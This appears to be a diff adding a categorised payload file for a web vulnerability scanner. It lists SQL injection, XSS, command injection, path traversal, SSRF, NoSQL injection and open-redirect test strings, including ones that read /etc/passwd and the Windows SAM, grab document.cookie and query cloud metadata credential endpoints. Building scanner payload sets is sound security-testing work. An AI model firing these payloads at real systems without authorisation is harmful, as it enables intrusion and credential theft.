@@ -1,0 +1,98 @@
+# WebSentinel — Custom Payload File (TXT format)
+# ─────────────────────────────────────────────────────
+# Format rules:
+#   - Lines starting with # are comments (ignored)
+#   - [category] headers switch the active category
+#   - One payload per line
+#   - Blank lines are ignored
+#
+# Supported categories:
+#   [sqli]  [xss]  [cmd]  [lfi]  [ssrf]  [nosql]  [open_redirect]  [custom]
+#
+# Use [custom] for payloads that should be tested across ALL categories.
+# ─────────────────────────────────────────────────────
+
+
+[sqli]
+' OR '1'='1' --
+' OR 1=1 LIMIT 1--
+" OR "1"="1
+') OR ('1'='1
+1' AND SLEEP(3)--
+'; EXEC xp_cmdshell('whoami')--
+1 UNION ALL SELECT NULL,NULL,NULL--
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+' OR 1=1 ORDER BY 1--
+WAITFOR DELAY '0:0:3'--
+
+
+[xss]
+<img src=x onerror="alert(document.domain)">
+<svg/onload=alert`1`>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<details open ontoggle=alert(1)>
+<input autofocus onfocus=alert(1)>
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+<math><mtext></style><img src=x onerror=alert(1)>
+"><img src=x onerror=alert(document.cookie)>
+<ScRiPt>alert(1)</ScRiPt>
+
+
+[cmd]
+; whoami
+| id
+&& cat /etc/passwd
+; ls -la /
+`id`
+$(id)
+; ping -c 1 127.0.0.1
+| net user
+; curl http://127.0.0.1
+&& type C:\Windows\System32\drivers\etc\hosts
+
+
+[lfi]
+../../../../../../../../etc/passwd%00
+....//....//....//etc/passwd
+/etc/passwd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+....\/....\/....\/etc/passwd
+/proc/self/environ
+../../../../windows/system32/config/sam
+../../../../boot.ini
+php://filter/read=convert.base64-encode/resource=/etc/passwd
+
+
+[ssrf]
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://metadata.google.internal/computeMetadata/v1/
+http://100.100.100.200/latest/meta-data/
+http://192.168.1.1
+http://10.0.0.1
+http://172.16.0.1
+http://localhost:22
+http://localhost:3306
+http://localhost:6379
+dict://127.0.0.1:6379/info
+
+
+[nosql]
+{"$gt": ""}
+{"$ne": "invalid"}
+{"$in": [""]}
+{"$regex": ".*"}
+{"$where": "this.password.length > 0"}
+[$ne]=notexists
+[$gt]=
+{"$or": [{"a": "a"}, {"a": "a"}]}
+
+
+[open_redirect]
+//attacker.example.com
+https://attacker.example.com
+///attacker.example.com
+/\attacker.example.com
+//attacker.example.com/%2f..
+https://legit.com.attacker.example.com
